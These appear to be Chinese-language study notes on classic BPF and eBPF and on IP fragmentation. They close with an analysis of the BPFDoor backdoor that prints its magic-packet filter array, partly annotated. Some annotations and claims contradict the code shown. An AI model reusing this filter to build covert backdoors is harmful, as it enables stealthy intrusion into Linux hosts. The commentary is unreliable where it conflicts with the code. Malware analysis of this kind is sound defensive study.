


# 前置知识


## BPF

### BPF 简介
Berkeley Packet Filter (BPF) 最早版本的 BPF 是 1990 年代由 Berkeley 大学开发，用于高效地从网络接口中抓包，主要用于工具如 tcpdump.

extended BPF (eBPF) 是 BPF 的现代增强版，功能大幅扩展，早已超越原始的网络包过滤用途。eBPF 兼容 BPF.

| 特性     | BPF（经典 BPF）       | eBPF（扩展 BPF）                         |
| ------ | ----------------- | ------------------------------------ |
| 最初用途   | 抓包过滤（如 `tcpdump`） | 内核级编程平台（网络、安全、追踪、监控等）                |
| 指令集    | 简单、少数指令           | 丰富、支持调用 helper 函数、更多寄存器              |
| 程序大小限制 | 很小（\~4096 字节）     | 更大（\~1M），允许复杂逻辑                      |
| 执行上下文  | 网络包捕获             | 内核挂钩（kprobe、tracepoint、XDP、LSM 等）    |
| 安全机制   | 无                 | 有：Verifier 校验程序安全性                   |
| 编程语言支持 | 汇编                | C（通过 LLVM）、bpftrace、Python（bcc）等     |
| 内核集成程度 | 较低                | 高度集成，可与多种内核子系统配合                     |
| 数据交互   | 无 map、共享数据机制      | 有 map、ringbuf、perf buffer 等与用户空间交互机制 |
| 状态管理   | 无                 | 支持持久状态（通过 BPF map）                   |


### BPF 原理

[BPF document](https://docs.kernel.org/bpf/)
cBPF（Classic BPF）架构非常简洁，只有 2 个 32 位寄存器：

寄存器	名称	作用
A	Accumulator（累加器）	所有算术运算、比较、加载/存储操作主要在这个寄存器上进行
X	Index Register（索引寄存器）	作为辅助寄存器，用于索引访问、部分算术运算、条件跳转等

### BPF 应用

Classic BPF（cBPF）代码，用于创建一个 Linux 原始套接字的 BPF 数据包过滤器
```c
struct sock_filter {
    __u16 code; // 操作码（指令）
    __u8 jt;    // 条件跳转成功时跳几条
    __u8 jf;    // 条件跳转失败时跳几条
    __u32 k;    // 常数参数
};
```


## IP 分片

当 IP 包大小超过路径某段链路的最大传输单元 (max transmission unit, MTU) 且允许分片（DF=0）时，IP 层就会进行分片。

IP 分片（Fragmentation） 是指：当一个 IP 包的大小（总长度）超过了沿途某段链路的 MTU（最大传输单元），就必须将这个包拆成多个碎片传输，以适应链路的最大包长限制。

IP 数据包会在满足 以下情况时发生分片（Fragmentation）：

🚧 二、什么情况下会触发 IP 分片？
- 条件 1：IP 数据包长度 > 路径上的某个 MTU，常见 MTU：以太网默认是 1500 字节；
- 条件 2：该 IP 包允许分片（Don't Fragment = 0）。IP 报文头中的 Flags 字段有一位叫 DF（Don't Fragment）：
```
Flag 位	含义
DF = 1	不允许分片，若不能传就丢弃并回 ICMP
DF = 0	可以分片
```
要触发真正的“IP 分片”，两个条件都要满足：IP包长度 > MTU 且 DF=0
🧪 三、分片字段（IP头）
分片时，IP 包头的这几个字段特别关键：

字段名|含义
-|-
Identification	| 所有分片有相同的 ID，用于重组
Fragment Offset	| 分片偏移量（单位为 8 字节）
MF（More Fragments）|	除最后一个分片外都设为 1，最后一个为 0
DF（Don't Fragment）|	设置为 1 时不允许分片

![alt text](<images/01 BPFDoor 原理/image-2.png>)

### IP 分片安全问题

攻击者可能利用分片：
- 绕过防火墙（IP分片重组后的 payload 被分散）
- 构造 overlapping fragments → 触发协议实现漏洞（Teardrop 攻击）
- BPFDoor 类木马使用分片包绕过过滤器

# BPFDoor 详细解析

- [BPF Instruction Set Architecture](https://www.kernel.org/doc/html/latest/bpf/standardization/instruction-set.html)
- [bpfdoor source code - github](https://github.com/gwillgues/BPFDoor/blob/main/bpfdoor.c)

```c
struct sock_filter bpf_code[] = {
                { 0x28, 0, 0, 0x0000000c },   // 01 ldh[12], 加载以太网帧第 12 字节开始的 2 字节内容，也就是 EtherType。
                { 0x15, 0, 27, 0x00000800 },  // 02 jeq #0x0800, jt=0, jf=27
                { 0x30, 0, 0, 0x00000017 },   // 03 ldb [23] 加载 IP 数据包第 23 字节，即 协议字段（protocol）
                { 0x15, 0, 5, 0x00000011 },   // 04 jeq #17, jt=0, jf=5 判断协议是否为 0x11 → UDP。不是就跳 5 条（丢弃该路径）。
                { 0x28, 0, 0, 0x00000014 },   // 05 ldh [20] 从 IP 数据开始第 20 字节读 2 字节 → 即 IP flags/fragment offset 字段。
                { 0x45, 23, 0, 0x00001fff },  // 06 jset #0x1fff, jt=23, jf=0 判断是否是分片包（低 13 位不为 0 表示是分片包），如果是，就跳转 23（丢弃）。
                { 0xb1, 0, 0, 0x0000000e },   // 07 ldh [22] 从UDP头部取源端口（以太网头14字节+IP头长度X，22偏移是UDP源端口位置）
                { 0x48, 0, 0, 0x00000016 },   // 08 jeq #29269 
                { 0x15, 19, 20, 0x00007255 }, // 09
                { 0x15, 0, 7, 0x00000001 },   // 10
                { 0x28, 0, 0, 0x00000014 },   // 11
                { 0x45, 17, 0, 0x00001fff },  // 12
                { 0xb1, 0, 0, 0x0000000e },   // 13
                { 0x48, 0, 0, 0x00000016 },   // 14
                { 0x15, 0, 14, 0x00007255 },  // 15
                { 0x50, 0, 0, 0x0000000e },   // 16
                { 0x15, 11, 12, 0x00000008 }, // 17
                { 0x15, 0, 11, 0x00000006 },  // 18
                { 0x28, 0, 0, 0x00000014 },   // 19
                { 0x45, 9, 0, 0x00001fff },   // 20
                { 0xb1, 0, 0, 0x0000000e },   // 21
                { 0x50, 0, 0, 0x0000001a },   // 22
                { 0x54, 0, 0, 0x000000f0 },   // 23
                { 0x74, 0, 0, 0x00000002 },   // 24
                { 0xc, 0, 0, 0x00000000 },    // 25
                { 0x7, 0, 0, 0x00000000 },    // 26
                { 0x48, 0, 0, 0x0000000e },   // 27
                { 0x15, 0, 1, 0x00005293 },   // 28
                { 0x6, 0, 0, 0x0000ffff },    // 29
                { 0x6, 0, 0, 0x00000000 },    // 30 
        };
```


![alt text](<images/01 BPFDoor 原理/image.png>)

![alt text](<images/01 BPFDoor 原理/image-1.png>)
